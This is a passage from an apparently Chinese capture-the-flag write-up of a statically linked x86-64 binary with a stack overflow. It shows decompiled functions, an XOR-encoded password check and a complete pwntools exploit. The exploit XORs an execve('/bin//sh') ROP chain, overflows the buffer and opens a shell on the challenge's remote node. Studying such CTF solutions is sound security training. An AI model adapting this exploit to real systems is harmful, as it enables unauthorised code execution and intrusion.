pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\n再来看看这道题还有什么别的：main\n__int64 sub_4005A0()&#123;  char v1[520]; // [rsp+0h] [rbp-208h] BYREF  sub_400BF0();  sub_410550(&quot;Please enter your Password: &quot;);  sub_449BE0(0, v1, 0x200uLL);  if ( (unsigned int)sub_400C40(v1) )    sub_410550(&quot;Correct!&quot;);  else    sub_410550(&quot;Wrong!&quot;);  return 0LL;&#125;\nprintf\n__int64 __fastcall sub_410550(__int64 a1)&#123;  __int64 v2; // rax  _QWORD *v3; // rbp  __int64 v4; // rbx  _DWORD *v5; // rdi  int v6; // eax  unsigned __int64 v8; // r8  bool v10; // zf  int v11; // eax  __int64 v12; // r13  _BYTE *v13; // rax  unsigned __int64 v14; // rbx  __int64 v15; // rdx  v2 = sub_4004C0();  v3 = off_6BA7A0;  v4 = v2;  v5 = off_6BA7A0;  if ( (*(_DWORD *)off_6BA7A0 &amp; 0x8000) == 0 )  &#123;    _RDX = *((_QWORD *)off_6BA7A0 + 17);    v8 = __readfsqword(0x10u);    if ( *(_QWORD *)(_RDX + 8) == v8 )    &#123;LABEL_9:      ++*(_DWORD *)(_RDX + 4);      goto LABEL_10;    &#125;    _ESI = 1;    v10 = dword_6BD80C == 0;    if ( dword_6BD80C )    &#123;      v6 = *(_DWORD *)off_6BA7A0 &amp; 0x8000;      if ( v6 == _InterlockedCompareExchange((volatile signed __int32 *)_RDX, 1, v6) )        goto LABEL_8;    &#125;    else    &#123;      __asm &#123; cmpxchg [rdx], esi &#125;      if ( v10 )      &#123;LABEL_8:        _RDX = v3[17];        v5 = off_6BA7A0;        *(_QWORD *)(_RDX + 8) = v8;        goto LABEL_9;      &#125;    &#125;    sub_44C130(_RDX, 1LL);    goto LABEL_8;  &#125;LABEL_10:  v11 = v5[48];  if ( v11 )  &#123;    if ( v11 != -1 )      goto LABEL_28;  &#125;  else  &#123;    v5[48] = -1;  &#125;  v12 = *((_QWORD *)v5 + 27);  if ( (char *)&amp;off_6BC2C8 - (char *)&amp;unk_6BBC20 &lt;= (unsigned __int64)(v12 - (_QWORD)&amp;unk_6BBC20) )  &#123;    sub_412C50();    v5 = off_6BA7A0;  &#125;  if ( v4 != (*(__int64 (__fastcall **)(_DWORD *, __int64, __int64))(v12 + 56))(v5, a1, v4) )    goto LABEL_28;  v13 = (_BYTE *)*((_QWORD *)off_6BA7A0 + 5);  if ( (unsigned __int64)v13 &lt; *((_QWORD *)off_6BA7A0 + 6) )  &#123;    *((_QWORD *)off_6BA7A0 + 5) = v13 + 1;    *v13 = 10;    goto LABEL_17;  &#125;  if ( (unsigned int)sub_416970(off_6BA7A0, 10LL) == -1 )  &#123;LABEL_28:    LODWORD(v14) = -1;    goto LABEL_19;  &#125;LABEL_17:  v14 = v4 + 1;  if ( v14 &gt; 0x7FFFFFFF )    LODWORD(v14) = 0x7FFFFFFF;LABEL_19:  if ( (*(_DWORD *)v3 &amp; 0x8000) == 0 )  &#123;    v15 = v3[17];    v10 = (*(_DWORD *)(v15 + 4))-- == 1;    if ( v10 )    &#123;      *(_QWORD *)(v15 + 8) = 0LL;      if ( dword_6BD80C )      &#123;        if ( !_InterlockedDecrement((volatile signed __int32 *)v15) )          return (unsigned int)v14;        goto LABEL_25;      &#125;      v10 = (*(_DWORD *)v15)-- == 1;      if ( !v10 )LABEL_25:        sub_44C160(v15);    &#125;  &#125;  return (unsigned int)v14;&#125;\nread\nunsigned __int64 __fastcall sub_449BE0(unsigned int fd, char *buf, size_t count)&#123;  unsigned __int64 result; // rax  unsigned __int64 v5; // rax  unsigned int v6; // r8d  unsigned __int64 v7; // [rsp+0h] [rbp-20h]  if ( dword_6BD80C )  &#123;    sub_44C180();    v5 = sys_read(fd, buf, count);    if ( v5 &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)v5);      v5 = -1LL;    &#125;    v7 = v5;    sub_44C1E0(v6);    return v7;  &#125;  else  &#123;    result = sys_read(fd, buf, count);    if ( result &gt; 0xFFFFFFFFFFFFF000LL )    &#123;      __writefsdword(0xFFFFFFC0, -(int)result);      return -1LL;    &#125;  &#125;  return result;&#125;\n这个函数会把传入的参数进行异或，所以我们要先把先前生成的rop链异或再传入,顺便缩短一下ropchain\n_BOOL8 __fastcall sub_400C40(const char *a1)&#123;  char *v1; // rbp  int v2; // edx  unsigned int v3; // eax  __int64 v4; // rbp  __int64 v5; // r12  char *v6; // rax  char *v7; // rdx  _BOOL8 result; // rax  char v9; // [rsp+8h] [rbp-50h] BYREF  _BYTE v10[7]; // [rsp+9h] [rbp-4Fh] BYREF  char v11[72]; // [rsp+10h] [rbp-48h] BYREF  v1 = strcpy(&amp;v9, a1);  do  &#123;    v2 = *(_DWORD *)v1;    v1 += 4;    v3 = ~v2 &amp; (v2 - 16843009) &amp; 0x80808080;  &#125;  while ( !v3 );  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v3 &gt;&gt;= 16;  if ( (~v2 &amp; (v2 - 16843009) &amp; 0x8080) == 0 )    v1 += 2;  v4 = &amp;v1[-__CFADD__((_BYTE)v3, (_BYTE)v3) - 3] - &amp;v9;  v5 = sub_4102B0(&quot;pass_enc.txt&quot;, &amp;unk_4A593F);  if ( (__int16)v4 &gt; 0 )  &#123;    v6 = v10;    v7 = &amp;v9;    while ( 1 )    &#123;      *v7 ^= 0x66u; //这里有个异或      v7 = v6;      if ( v6 == &amp;v10[(__int16)v4 - 1] )        break;      ++v6;    &#125;  &#125;  result = 0LL;  if ( v5 )  &#123;    sub_4103D0(v11, 40LL, 1LL, v5);    sub_40FD50(v5);    return (unsigned int)sub_400498(v11, &amp;v9) == 0;  &#125;  return result;&#125;\nexp:\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()","tags":["shellcode"]}]